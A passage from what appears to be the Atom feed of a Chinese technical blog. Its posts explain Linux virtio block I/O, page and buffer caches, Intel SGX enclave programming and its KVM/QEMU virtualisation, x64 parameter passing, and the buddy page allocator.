alt=""></p><h1>Virtio模拟I/O</h1><p>下图中，最上面一排(virtio_blk等)是前端驱动，它们是在客户机中存在的驱动程序模块，而后端处理程序是在QEMU中实现的。在前端和后端之间，定义了两层来支持guest和QEMU之间的通信。virtio层是虚拟队列借口，一个前端驱动程序可以使用多个队列。虚拟队列实际上是guest操作系统和hyperviosr的衔接点。而virtio-ring实现了环形缓冲区，它用来保存前端驱动和后端处理程序执行的信息，并且它可以一次性保存前端驱动的多次I/O请求，并且交由后端驱动去批量处理，最后实际调用host中设备驱动实现物理上的I/O操作，这样做就可以实现批量处理，而不是客户机中的每次I/O请求都需要处理一次，从而提高了guest和hypervisor信息交换的效率。</p><p><img src="http://www.meng.uno/images/virtio/virtio.jpg" alt=""></p><h1>virtio_blk</h1><p>在linux中，对于块设备的访问，通常是用一个I/O队列，来维护一系列的bio数据结构，通常一个请求可能包含多个bio结构。bio是上层内核vfs与下层驱动连接的纽带。<br> virtio_blk结构体中的gendisk结构多request_queue队列接收block层的bio请求，按照request_queue队列默认处理过程，bio请求会在io调度层转化为request，然后进入request_queue队列，最后调用virtblk_request将request转化为vbr结构，最后由QEMU接管处理。  <br> QEMU处理过vdr之后，会将它加入到virtio_ring的request队列，并发一个中断给队列，队列的中断响应函数vring_interrupt调用队列的回调函数virtblk_done。  <br> 最后由request_queue注册的complete函数virtblk_request_done处理，通过blk_mq_end_io通告块设备层IO结束。</p><p><img src="http://www.meng.uno/images/virtio/liftcycle.jpg" alt=""></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1ae8cec4/">http://home.meng.uno/articles/1ae8cec4/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Virtio简介
virtio是KVM虚拟环境下，针对I/O虚拟化的通用框架。virtio是一个半虚拟化驱动。首先说明一下全虚拟化和半虚拟化的区别。全虚拟化是指guest操作系统运行在物理机器上的hypervisor上，它不知道自己已被虚拟化，不需要任何更改就可以工作。半虚拟化指的是guest操作系统不仅知道它运行在hypervisor上，还包括让guest操作系统更高效与hyperviosr交互的代码(驱动程序)。

QEMU模拟I/O
如果使用QEMU模拟I/O，当guest中的设备驱动程序发起I/O操作请求时，KVM中的I/O操作捕获代码会将这次I/O请求拦截，在经过处理后将这次I/O请
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="虚拟化" scheme="http://home.meng.uno/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="Virtio" scheme="http://home.meng.uno/tags/Virtio/"/>
    
  </entry>
  
  <entry>
    <title>页缓存（Page Cache）</title>
    <link href="http://home.meng.uno/articles/4314a663/"/>
    <id>http://home.meng.uno/articles/4314a663/</id>
    <published>2016-04-16T04:22:47.000Z</published>
    <updated>2020-12-02T02:00:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1>buffer cache/page cache</h1><p>linux中存在有两个缓存，buffer cache是针对设备的缓存，而page cache是针对文件的缓存。对于一个ext4文件系统来说，每个文件都有一棵radix树管理文件的缓存页，这些缓存页就是page cache；而对于每个块设备来说，都有一棵radix树来管理数据的缓存块，这些缓存块被称为buffer cache。在常见的linux系统中，page cache通常以4kb为单位，而buffer cache的大小由块设备来决定，通常是512B。总的来说，page cache是对文件数据的缓存，而buffer  cache是对设备数据的缓存。</p><p>在linux 2.4之前，这两个cache是有区别的，但这明显会产生一些浪费。因此在2.4之后的内核版本中，这两个cache就被统一化了：使用page cache。如果一个缓存数据既代表文件又代表块，那么buffer cache就直接指向page cache。</p><p>但是buffer cache依然是保留的。因为内核依然需要进行block的I/O。由于大部分block表示的是文件数据，因此它们都通过page cache的形式来缓存。但是剩下的小部分数据不是文件：它们是metadata活着原始的block I/O，这一部分依然由buffer cache来保存。</p><p>linux当中，所有的文件I/O操作，都是通过page cache来实现的。写操作是通过将page cache中对应的页标记为脏页来实现的；读操作是通过从page cache中返回数据来实现的。如果数据还不在cache中，就先把它读到cache里面。</p><p>如果只是研究一般文件的读写，那么就只需要在意page cache，不用去关心buffer cache。</p><h1>关系</h1><p>现在我们知道，在linux中，大部分文件都采用了page cache的形式来进行缓存。但是块设备的读写，却是以块的形式来进行的。前面有提到，page cache通常以4kb为单位，而buffer cache则通常是512B的。实际上，一个或多个buffer cache组成了一个page cache。</p><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/cache.jpg" alt="page&amp;amp;buffer"></p><p>linux支持的文件系统，大多以块的形式组织文件。在文件以块的形式调入内存后，就以buffer cache的形式，对它们进行管理。buffer cache由两个部分组成，分别是缓冲区的首部buffer_head，和实际的缓冲区内容。buffer_head中，有一个指向数据的指针，和一个缓冲区长度的字段，这两个部分并不相邻。每当以块的形式，将数据读入内存时，它就要被存储在一个缓冲区当中，而buffer_head则起到一个描述符的作用。</p><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/bufferhead.jpg" alt="bufferhead"></p><p>在从块设备中读写文件页的时候，会根据不同情况，来构造bio。bio中，io_vec中，bv_page字段，会指向page。在2.6版本后，buffer_head只给上层提供有关其描述的块的当前状态，描述磁盘块到物理内存的映射关系，而bio则负责所有块I/O操作。</p><p>在linux中，mpage_readpage试图读取文件中一个page大小的数据。最理想的情况下，这个page大小的数据都在连续的物理磁盘上吗，函数只需要提交一个bio就可以获取所有的数据。这里使用get block函数，检查物理块是否连续。如果连续，则直接调用mpage_bio_submit函数请求整个page的数据，不连续则调用block_read_full_page逐个block读取，建立bh和bio之间的关系。mpage从来不回把不完整的页放进bio中，除非是文件的结尾。</p><h1>页高速缓存到用户空间</h1><p>所谓的页高速缓存到用户空间，实际上分为两种：一种是read到用户空间，也就是复制到用户空间中的堆中去；第二种是映射，mmap是在堆外的空间。</p><p>读取，要经过两次复制：</p><ul>  <li>第一次是从磁盘中读取来填充页缓存中的页；</li>  <li>第二次是将是从内存中的页缓存，读取到进程堆空间的内存中。</li></ul><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/read.png" alt="read"></p><p>映射，只有一次复制：从磁盘中复制到缓存中。mmap会创建一个虚拟内存区域vm_area_struct，进程的task_struct包含了进程页表项，让这些页表项指向页缓存所在的物理页page。</p><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/mmap.png" alt="mmap"></p><p>由于程序的代码段必然是通过mmap来实现的，因此它们在使用时，其实是保存在页缓存中的。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/4314a663/">http://home.meng.uno/articles/4314a663/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      buffer cache/page cache
linux中存在有两个缓存，buffer cache是针对设备的缓存，而page cache是针对文件的缓存。对于一个ext4文件系统来说，每个文件都有一棵radix树管理文件的缓存页，这些缓存页就是page cache；而对于每个块设备来说，都有一棵radix树来管理数据的缓存块，这些缓存块被称为buffer cache。在常见的linux系统中，page cache通常以4kb为单位，而buffer cache的大小由块设备来决定，通常是512B。总的来说，page cache是对文件数据的缓存，而buffer cache是对设备数据的缓存。
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="I/O" scheme="http://home.meng.uno/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>SGX</title>
    <link href="http://home.meng.uno/articles/4b3349ff/"/>
    <id>http://home.meng.uno/articles/4b3349ff/</id>
    <published>2016-04-10T03:33:26.000Z</published>
    <updated>2020-12-02T01:43:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1>1 SGX</h1><p>SGX: Software Guard Extensions</p><p>在运行时，程序可以分为几个部分：</p><ol>  <li>Untrusted Run-Time System:在SGX enclave外部执行的部分，负责加载和管理一个enclave，并且Ecall enclave，接受enclave中的Ocall。</li>  <li>Trusted Run-Time System:在SGX enclave内部执行的部分，接受Ecall，进行Ocall，并对enclave自身进行管理。</li>  <li>Edge routines：指的是函数边的情况。</li>  <li>第三方库：为SGX定制的库。</li></ol><hr><ul>  <li>ECall：Enclave call，调用enclave当中的函数。</li>  <li>OCall：Out call，从enclave内部到外部的调用。</li></ul><p>在SGX中，enclave是用来减少信任基的，在运行时不可信域决定了可信域函数的调用顺序，也决定了起内部的上下文；并且ECall和OCall的返回值和参数也是不可信的。</p><p><img src="http://www.meng.uno/images/SGX/SGX.png" alt="sgx"></p><hr><p>文件格式：除了代码段、数据段之外，enclave文件还包含<strong>metadata</strong>,一个untrusted loader需要使用这个metadata来决定这个enclave如何被装载。</p><h1>2 Enclave接口</h1><p>将一个应用划分为trusted和untrusted两部分之后，需要定义二者之间的接口。不可信的应用通过ISV接口函数，对共享库进行调用(ECall)；而从Enclave对外部进行调用时(OCall)，在函数执行完后会返回可信的区域继续执行；中断也不会破坏这个过程。</p><p>Enclave需要暴露一部分接口给外部应用(ECalls)，同时又要声明哪些外部提供的服务(OCalls)是必须的。</p><p>Enclave的输入和输出都是不可信的代码可见的，因此enclave不能信任任何不可信域中的信息，检测ECall的输入参数和OCall的返回值。<br> Enclave中的参数等，都保存在可信的环境中，并且其读写不会对ISV代码和数据的完整性造成影响；而参数的长度、返回值等都由ISV来指定。对于引用的输入，enclave会进行更特殊的处理，确定指针所指的内存区域是否在enclave的线性范围之内。</p><p>对于操作系统的服务，Enclave是不能直接使用的，必须通过OCall作为接口，其return值作为输入传回给Encalve，这个值也是不可信的。</p><p>如果在OCall中使用了ECall，这就是一个nested ECall，使用者应该避免这种情况的发生，如果必须使用，则要对接口进行限制。</p><h2 id="enclave-definition-language">Enclave Definition Language</h2><p>EDL文件，用来描述enclave当中的trusted和untrusted部分。在Linux中，Edger8r Tool通过这个文件来创建enclave的C wrapper函数，也即ECALL和OCALL所使用的函数。</p><pre><code>//EDL Templateenclave{//包含文件和作为参数的数据结构trusted {//任何enclave_t.h中包含的文件//trusted function原型};untrusted {//任何enclave_u.t中包含的文件//untrusted function原型};};</code></pre><p>EDL文件不允许include有自定义类型的头文件。对于全局的包含文件，也不会包含在enclave当中。这类情况会使用不同的头文件，例如SGX会利用SDK所提供的stdio.h，而应用会使用由编译器提供的stdio.h。</p><h2 id="edl中的数据">EDL中的数据</h2><p>EDL中可以使用基本的关键字，包括</p><pre><code>char, short, long, int, float, double, void, int8_t, int16_t, int32_t, int64_t, size_t, wchar_t, uint8_t, uint16_t, uint32_t, uint64_t, unsigned, struct, enum, union</code></pre><p>其它类型可以在头文件中包含。用户定义的数据类型可以在EDL中使用，但要遵守其编写的规范。正确的定义如下</p><pre><code>enclave{include &quot;user_types.h&quot; </code></pre><p>struct struct_foo_t { uint32_t struct_foo_0; uint64_t struct_foo_1; }; enum enum_foo_t { ENUM_FOO_0 = 0, ENUM_FOO_1 = 1 }; }; trusted { public void test_char(char val); public void test_int(int val); public void test_long(long long val); };</p><h2 id="edl中的指针">EDL中的指针</h2><p>EDL中定义有一些和指针一起使用的值，这些值是用在ECALL和OCALL时使用的参数上的。指针需要用in,out,或者user_check进行明确的修饰。其中[in]和[out]说明的是方向：</p><ul>  <li>[in]表示参数从调用方传递到被调用放，对ECALL来说，in是从应用程序传递到enclave中，对OCALL来说则表示参数从应用程序传递到enclave中。</li>  <li>[out]表示参数是从被调用方返回到调用方。对ECALL来说，out表示参数从enclave传递到应用中，对OCALL来说则是从应用传递给enclave。</li>  <li>[in]和[out]组合使用表示参数是双向传递的。</li></ul><p>方向属性能够用来提供保护，但会降低性能。如果使用user_check，则表示在不可信内存中的数据会在使用前进行验证。但[in]和[out]不支持包含有指针的结构体，这种情况必须使用user_check，并进行手动的验证。为了保证copy指针指向数据的安全性，它们还会和size，count，sizefun等一起使用。</p><h2 id="其它数据类型">其它数据类型</h2><p>string和wstring表示参数是一个以NULL结束的字符串。</p><p>EDL支持用户定义的数据类型，但是不能定义在头文件中。任何使用typedef的基本类型，也都是用户定义的数据类型。有一些数据类型必须指定EDL属性，例如isptr，isary，readonly等，否则edger8r在编译时会报错。</p><p>propagate_error是OCALL的一个属性，如果使用这个属性，则enclave中的errno属性，会在OCALL返回之前被覆写为untrusted域中的errno中的值。在OCALL完成之后，无论OCALL是否成功，trusted域中的都会在OCALL完成之后更新。如果function失败了，那么errno就会检查是否出错，而如果函数成功了，那么OCALL就被允许修改errno的值。</p><h2 id="ecall访问-配置">ECALL访问/配置</h2><p>默认的情况下，ECALL函数是不能直接被任何untrusted functions调用的。为了允许应用程序直接调用一个ECALL函数，则这个ECALL必须用public关键字来修饰。<br> Enclave配置文件是一个XML文件，它包含了用户定义的enclave参数，也是enclave项目的一部分。sgx_sign利用这个文件作为输入，来创建enclave的signature和metadata，它包括有这些项：</p><pre><code>&lt;EnclaveConfiguration&gt;&lt;ProdID&gt;100&lt;/ProdID&gt; &lt;ISVSVN&gt;1&lt;/ISVSVN&gt; &lt;StackMaxSize&gt;0x50000&lt;/StackMaxSize&gt;&lt;HeapMaxSize&gt;0x100000&lt;/HeapMaxSize&gt;&lt;TCSNum&gt;1&lt;/TCSNum&gt;&lt;TCSPolicy&gt;1&lt;/TCSPolicy&gt;&lt;DisableDebug&gt;0&lt;/DisableDebug&gt;&lt;MiscSelect&gt;0&lt;/MiscSelect&gt;&lt;MiscMask&gt;0xFFFFFFFF&lt;/MiscMask&gt;&lt;/EnclaveConfiguration&gt;</code></pre><h2 id="enclave加载">Enclave加载</h2><p>Enclave的源代码被编译为一个共享对象，为了使用一个enclave，enclave.so应该通过调用sgx_create_enclave()函数来加载到受保护的内存中。在第一次加载一个enclave时，加载器会获取launch token并且将它保存到token参数当中，用户能够将它保存在一个文件中，并且在之后加载时，从文件中获取token。而卸载enclave则是由用户调用sgx_destory_enclave(sgx_enclave_id_t)来实现的。</p><pre><code>#define ENCLAVE_FILE _T(&quot;Enclave.signed.so&quot;)sgx_enclave_id_t eid;sgx_status_t ret = SGX_SUCCESS; sgx_launch_token_t token = {0};int updated = 0;//创建sgx_create_enclave(ENCLAVE_FILE, SGX_DEBUG_FLAG, &amp;token, &amp;updated, &amp;eid, NULL);//摧毁sgx_destroy_enclave(eid);</code></pre><h2 id="untrusted-trusted-library-functions">Untrusted/Trusted Library Functions</h2><p>untrusted函数只能在应用中，也就是enclave的外部调用。这些函数包括：</p><ul>  <li>Enclave的创建和摧毁</li>  <li>Quoting（用来确定处于SGX环境中）</li>  <li>untrusted key交换</li>  <li>平台服务和启动控制</li></ul><p>trusted库和enclave binary静态链接，它们只能在enclave内部使用。 Trusted Runtime System是SDK的一个关键组件，它提供enclave的入口逻辑，其他的helper函数，以及自定义的异常处理。<br> Trusted Service Library对数据进行保护，它包括有：</p><p>－ Wrapper函数 － sealing/unsealing － Trusted平台服务函数</p><h2 id="sdk">SDK</h2><p>SGX的SDK目前提供了两种模式，hardware模式，也即在物理上拥有sgx的计算机上能够使用；而simulation则是模拟拥有sgx的计算机。在DEBUG模式中，<a href="http://xn--enclave-oc6k743agrae06b79qyhoi01dgjec1br62b5gtwgeut2cch5a.signed.so" target="_blank" rel="noopener">开发者能够直接使用被签名过的enclave.signed.so</a>，而不需要自己去进行签名。</p><h1>3 Signature</h1><p>在Enclave中，可信环境的建立有三个主要的部分，分别是<br> Measurement：当前环境下的，enclave的身份证明  <br> Attestation：向其他部分证明自身可信  <br> Sealing：能够在可信环境恢复时，恢复其相关的数据</p><hr><h2 id="measurement">Measurement</h2><p>Enclave包含一个由author提供的证书，也即Enclave Signature，它能够让SGX来检测enclave文件是否被篡改了，从而证明这个enclave是可信的。但硬件只在装载的时候进行检验，因此enclave signature还会对author进行验证，它包含这些部分：<br> Enclave Measurement、Enclave Author的公钥、Security Verision Number、Product ID</p><h2 id="attestation">Attestation</h2><p>Attestation指的是第三方能够证实软件是在SGX平台上运行的。Intel SGX架构支持两种验证：本地验证和远程验证。</p><p>本地验证：一个enclave和另一个enclave协作，那么这两者之间就需要进行验证。enclave能够使用硬件来生成credential(report)，用来发给另一个enclave进行验证。</p><p>远程验证：一个拥有enclave的应用需要使用一个平台外的服务时，能够使用enclave来制造一个report，并且将它给平台服务，来产生一个credential(quote)，使用EPID技术来进行验证它来进行检测。</p><h2 id="sealing">Sealing</h2><p>在enclave被销毁时，需要识别出其中需要保护的data和state，以便在之后仍然能够在enclave中使用这些数据。这些数据只有被保存在enclave的外部。有两种情形：<br> Seal到当前Enclave：在enclave创建时会有一个MRENCLAVE，只有拥有相同的MRENCLAVE才能unseal  <br> Seal到Enclave作者：在enclave创建时会有一个MRSIGNER，只有拥有相同MRSIGNER才能unseal</p><h1>4 处理器特性</h1><p>enclave writer需要依赖编译器和库，他无法知道生成的enclave是否使用了任何特殊的CPU拓展特性。不可信的loader可能会允许所有的特性，但是通过设置Enclave Signature Structure，是能够指定重载这部分的设置的。</p><p>在Enclave中，有一些指令是非法的，包括可能VMEXIT的，无法被软件处理的中断的，以及需要改变权限级别的，以及CPUID。</p><h1>5 Power Management</h1><p>现代操作系统提供的一种机制，允许应用被能耗事件通知。当平台进入S3和S4状态时，密钥会被擦除，所有的enclave会被销毁。Intel SGX并不直接提供Power down事件到enclave当中。应用可以为这些事件注册相应的回调函数，在其被调用时，将secret state保存到磁盘上。但OS不保证enclave有足够的时间去做这件事情，因此enclave最好通过power transition events对enclave state data进行周期性的保护。</p><h1>6 线程相关</h1><p>当多线程的程序运行时，thread Binding，TLS的使用都可能带来问题。对于enclave来说，开发者可以选择Non-Binding和Binding两种模式。Non-Binding模式会在不可信运行时，使用任意的TTC，并且使用一个root call进入enclave中，每次root call时，TLS都会被初始化；Binding模式下，不可信线程会和一个enclave中的可信线程绑定。</p><h1>SGX虚拟化</h1><h2 id="kvm-sgx">KVM-SGX</h2><p>虚拟机中的epc，使用sgx_vm_epc_buffer结构来管理的。其数据结构如下：</p><pre><code>struct sgx_vm_epc_buffer {struct list_head buf_list;struct list_head page_list;unsigned int nr_pages;unsigned long userspace_addr;__u32 handle;};</code></pre><p>Kai Huang添加了sgx_vm.c。</p><pre><code>__alloc_epc_buf:申请一个新的epc buffer，在这里对每一个页，都申请了一个iso_page。它调用sgx_alloc_vm_epc_page来完成具体的申请。这个函数定义在sgx_alloc_epc_page当中，实际上调用的就是sgx_alloc_epc_page。__get_next_epc_buf_handle():每一个epc buffer都有一个handle，这个handle相当于一个标识，利用handle来找到对应的epc buffer，这个函数用来在申请一个epc_buf的时候，获取它的handle。  __free_epc_buf():释放epc buffer，这里同样也要完成对应的iso_pages的释放。  __sgx_map_vm_epc_buffer():按页实际完成按页的映射，它调用了vm_insert_pfn函数。它进而调用vm_insert_pfn_prot，这个函数位于mm/memory.c中，也即完成一个页的映射(pfn to pfn)。</code></pre><p>在kvm_main.c中，hva_to_pfn函数被进行了修改，这是为了让pfn的映射，支持到EPC这一段内存，而epc并不是连续的，所以需要从页表中搜索到pfn。hva_to_pfn()，其参数address为host virtual address，通过一个guest页的hva，来找到对应的pfn。它调用了follow_pfn(使用user virtual address来查找一个页框)。</p><pre><code>只有在hva_to_pfn_fast/hva_to_pfn_slow都无法找到pfn时，才会使用这种方法。因为EPC不是连续的内存段，所以会用这种方法特殊处理。</code></pre><p>arch/x86/kvm/vmx.h/vmx.c中，做了VMX和SGX交互的修改。</p><pre><code>首先对于一部分enclave中不允许使用的指令，例如CPUID，INVD，做了#GP处理。vmx_exit_from_enclave():enclave中发生了VMEXIT的情况。这里使用了VM_EXIT_REASON的bit 27和GUEST_INTERRUPTIBILITY_INFO中的bit 4来表示VMEXIT的原因。vmx_handle_exit是对exit的具体处理。利用VM_EXIT_REASON的bit 27，可以判断这个exit是在enclave当中发生的。这个函数确定exit的类型，再交由对应的handler进行处理。</code></pre><h2 id="qemu-sgx">QEMU-SGX</h2><p>在target-i386/kvm.c当中，qemu首先为isgx定义了一个设备node:/dev/sgx，并且定义了VM中SGX的状态SGXState。在kvm.c中，定义了epc的alloc、free</p><pre><code>#define SGX_IOC_ALLOC_VM_EPC  _IOWR(SGX_MAGIC, 0x03, struct sgx_alloc_vm_epc)#define SGX_IOC_FREE_VM_EPC  _IOW(SGX_MAGIC, 0x04, struct sgx_free_vm_epc)</code></pre><p>这两个宏定义，最后交给了struct中对应的handle来处理，也即ISGX驱动中对应的函数。而qemu内部的接口则是kvm_alloc_epc/kvm_free_vm_epc。kvm.c中，还定义了epc的初始化和销毁。epc的计算是在vcpus创建之前完成的，这里epc的大小被限制在256M之内，它被放置在below_4g_memory_size的位置，位于PCI的基址之下。在target-i386/cpu.c中，添加了对cpuid对应功能的支持。 在/hw/i386/acpi-build.c当中，添加了EPC的ACPI  table项。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/4b3349ff/">http://home.meng.uno/articles/4b3349ff/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      1 SGX
SGX: Software Guard Extensions

在运行时，程序可以分为几个部分：

 1. Untrusted Run-Time System:在SGX enclave外部执行的部分，负责加载和管理一个enclave，并且Ecall enclave，接受enclave中的Ocall。
 2. Trusted Run-Time System:在SGX enclave内部执行的部分，接受Ecall，进行Ocall，并对enclave自身进行管理。
 3. Edge routines：指的是函数边的情况。
 4. 第三方库：为SGX定制的库。




 * ECall：E
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="SGX" scheme="http://home.meng.uno/tags/SGX/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统参数传递</title>
    <link href="http://home.meng.uno/articles/bc46dabc/"/>
    <id>http://home.meng.uno/articles/bc46dabc/</id>
    <published>2016-04-10T03:16:31.000Z</published>
    <updated>2020-12-02T01:39:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1>x64寄存器</h1><p>x64体系提供了16个通用寄存器，以及16个通用寄存器，以及16个浮点寄存器XMM/YMM寄存器。这些寄存器分为两类：</p><ul>  <li>易失寄存器：由调用方假想的临时寄存器，并要在调用过程中销毁。</li>  <li>非易失寄存器：需要在整个函数调用过程中保留其值，一旦使用，必须由调用方保存。</li></ul><p>也就是说，易失寄存器被定义为随时会改变，不用恢复它的初始值。但是如果要嵌入一些汇编语句，还是要对它们进行保护和恢复。而易失寄存器一旦使用，必须由调用方来对它们进行保存。也就是说在任何情况下使用它们，都必须进行保存。</p><table>  <thead>    <tr>      <th>寄存器</th>      <th>使用</th>      <th>是否在调用前保存</th>    </tr>  </thead>  <tbody>    <tr>      <td>RAX</td>      <td>临时寄存器传递参数寄存器数量，第一返回值寄存器</td>      <td>否</td>    </tr>    <tr>      <td>RBX</td>      <td>被调用者保存寄存器，选择性的基址指针</td>      <td>是</td>    </tr>    <tr>      <td>RCX</td>      <td>传递第四个参数</td>      <td>否</td>    </tr>    <tr>      <td>RDX</td>      <td>传递第三个参数，第二返回值寄存器</td>      <td>否</td>    </tr>    <tr>      <td>RSP</td>      <td>栈指针</td>      <td>是</td>    </tr>    <tr>      <td>RBP</td>      <td>被调用者保存寄存器，选择性的栈帧寄存器</td>      <td>是</td>    </tr>    <tr>      <td>RSI</td>      <td>传递第二个参数</td>      <td>否</td>    </tr>    <tr>      <td>RDI</td>      <td>传递第一个参数</td>      <td>否</td>    </tr>    <tr>      <td>R8</td>      <td>传递第五个参数</td>      <td>否</td>    </tr>    <tr>      <td>R9</td>      <td>传递第六个参数</td>      <td>否</td>    </tr>    <tr>      <td>R10</td>      <td>临时寄存器，用于传递函数的静态链指针</td>      <td>否</td>    </tr>    <tr>      <td>R11</td>      <td>临时寄存器</td>      <td>否</td>    </tr>    <tr>      <td>R12-R15</td>      <td>被调用者保护寄存器</td>      <td>是</td>    </tr>    <tr>      <td>xmm0-xmm1</td>      <td>传递和返回浮点参数</td>      <td>否</td>    </tr>    <tr>      <td>xmm2-xmm7</td>      <td>传递浮点参数</td>      <td>否</td>    </tr>    <tr>      <td>xmm8-xmm15</td>      <td>临时寄存器</td>      <td>否</td>    </tr>    <tr>      <td>mmx0-mmx7</td>      <td>临时寄存器</td>      <td>否</td>    </tr>    <tr>      <td>st0-st1</td>      <td>临时寄存器，用来保存long double返回值</td>      <td>否</td>    </tr>    <tr>      <td>st2-st7</td>      <td>临时寄存器</td>      <td>否</td>    </tr>    <tr>      <td>fs</td>      <td>系统预留(线程特殊寄存器)</td>      <td>否</td>    </tr>    <tr>      <td>mxcsr</td>      <td>SSE2控制和状态子寄存器</td>      <td>部分</td>    </tr>    <tr>      <td>x87 SW</td>      <td>x87状态字</td>      <td>否</td>    </tr>    <tr>      <td>x87 CW</td>      <td>x87控制字</td>      <td>是</td>    </tr>  </tbody></table><h1>参数传递</h1><p>可以看出，在Linux中，前6个参数都是利用寄存器来进行传递的。那么参数多于6个的情况下，是如何传递的呢？首先<strong>参数按照从左到右的顺序，依次使用寄存器</strong>，在寄存器被使用完后，参数<strong>从右到左依次入栈，使用堆栈进行参数的传递</strong>。此处有一个例子：</p><pre><code>typedef struct {int a, b;double d;} structparm;structparm s;int e, f, g, h, i, j, k;long double ld;double m, n;__m256 y;extern void func (int e, int f,structparm s, int g, int h,long double ld, double m,__m256 y,double n, int i, int j, int k);func (e, f, s, g, h, ld, m, y, n, i, j, k);</code></pre><p>那么，在这个函数的调用中，寄存器的使用情况如下：</p><table>  <thead>    <tr>      <th>通用寄存器</th>      <th>浮点寄存器</th>      <th>栈帧偏移</th>    </tr>  </thead>  <tbody>    <tr>      <td>%rdi:e</td>      <td>%xmm0:s.d</td>      <td>0:ld</td>    </tr>    <tr>      <td>%rsi:f</td>      <td>%xmm1:m</td>      <td>16:j</td>    </tr>    <tr>      <td>%rdx:s.a,s.b</td>      <td>%xmm2:y</td>      <td>24:k</td>    </tr>    <tr>      <td>%rcx:g</td>      <td>%xmm3:n</td>      <td></td>    </tr>    <tr>      <td>%r8:h</td>      <td></td>      <td></td>    </tr>    <tr>      <td>%r9:i</td>      <td></td>      <td></td>    </tr>  </tbody></table><p>此处存在两个疑问:第一、s.a,s.b为什么使用同一个寄存器；第二、ld为什么直接使用了栈帧传递？第一个是在结构体中，s.a，s.b是对齐可合并的，因此可以使用一个寄存器来传递这两个参数（此处存在疑问，是我自己的理解）；第二个是因为long double被归为X87类，这类参数是必须通过内存来传递的。</p><h1>Red zone</h1><p>在linux中，red zone是函数栈帧中，返回地址之下的一片区域，被调用函数可以使用red zone来储存局部变量，来避免对栈指针进行过多的修改。这大概就是在某些函数中，rsp直接被sub某个很大值的原因。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bc46dabc/">http://home.meng.uno/articles/bc46dabc/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      x64寄存器
x64体系提供了16个通用寄存器，以及16个通用寄存器，以及16个浮点寄存器XMM/YMM寄存器。这些寄存器分为两类：

 * 易失寄存器：由调用方假想的临时寄存器，并要在调用过程中销毁。
 * 非易失寄存器：需要在整个函数调用过程中保留其值，一旦使用，必须由调用方保存。

也就是说，易失寄存器被定义为随时会改变，不用恢复它的初始值。但是如果要嵌入一些汇编语句，还是要对它们进行保护和恢复。而易失寄存器一旦使用，必须由调用方来对它们进行保存。也就是说在任何情况下使用它们，都必须进行保存。

寄存器 使用 是否在调用前保存 RAX 临时寄存器传递参数寄存器数量，第一返回值寄存器 否 
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="64bits" scheme="http://home.meng.uno/tags/64bits/"/>
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>内存管理</title>
    <link href="http://home.meng.uno/articles/41e39f2b/"/>
    <id>http://home.meng.uno/articles/41e39f2b/</id>
    <published>2016-03-11T05:15:43.000Z</published>
    <updated>2020-12-02T01:55:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1>页框管理与伙伴系统</h1><p>这里的内存管理，指的是内核如何分配（为自己）动态内存。linux把页框作为一个管理的基本单位，用数据结构<code>page</code>对其进行描述。而所有的<code>page</code>则放在一个<code>mem_map</code>数组当中，进行管理。但计算机存在着一些限制，因此linux把内存划分为了几个管理区，包括ZONE_DMA、ZONE_NORMAL、ZONE_HIGHMEM等；而对页框的分配和释放，也是按照分区来进行管理的：</p><p><img src="http://www.meng.uno/images/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E9%A1%B5%E6%A1%86%E5%88%86%E9%85%8D.jpg" alt=""></p><p>在每个分区之内，页框由<strong>伙伴系统</strong>来进行处理。伙伴系统主要是为了解决“外碎片”的问题：当请求和释放不断发生的时候，就很有可能导致操作系统中发生存在空闲的小块页框，但是没有大块连续页框的问题。伙伴系统把空闲页分组成11个块链表，分别包含1，2，4，6,…,1024个连续的页框。每当有两个连续的大小为b的页框出现时（并且起始地址满足一个倍数条件），它们就被视为伙伴，伙伴系统就会把它们合并成大小为2b的页框。在页分配时，如果当前大小b的<code>free_list</code>中找不到空闲的页框，就会从2b的链表中寻找空闲页块，并且进行分割，将它分为两个大小为b的页块。</p><p>每个伙伴系统，管理的是<code>mem_map</code>的一个子集。在管理区描述符中，有一个<code>struct free_area</code>，它用来辅助伙伴系统：</p><pre><code>struct free_area {struct list_head        free_list[MIGRATE_TYPES];unsigned long           nr_free;}; </code></pre><p><code>free_list</code>是用来连接空闲页的链表数组，而nr_free则是当前内存区中空闲页块的个数。</p><h1>反碎片</h1><p>当然，上面说到的只是最基本的伙伴系统，但它并没有完全解决碎片的问题。linux中还采用了一种反碎片的机制，它根据已内存页的类型来工作：</p><ul>  <li>不可移动页：在内存中有固定的位置，不能移动到其他地方（kernel的大多数内存页）</li>  <li>可移动页：用户空间的页，只要更新页表项即可</li>  <li>可回收页：在内存缺少时，可以进行回收的页，例如从文件映射的页 （以及一些其他类型）  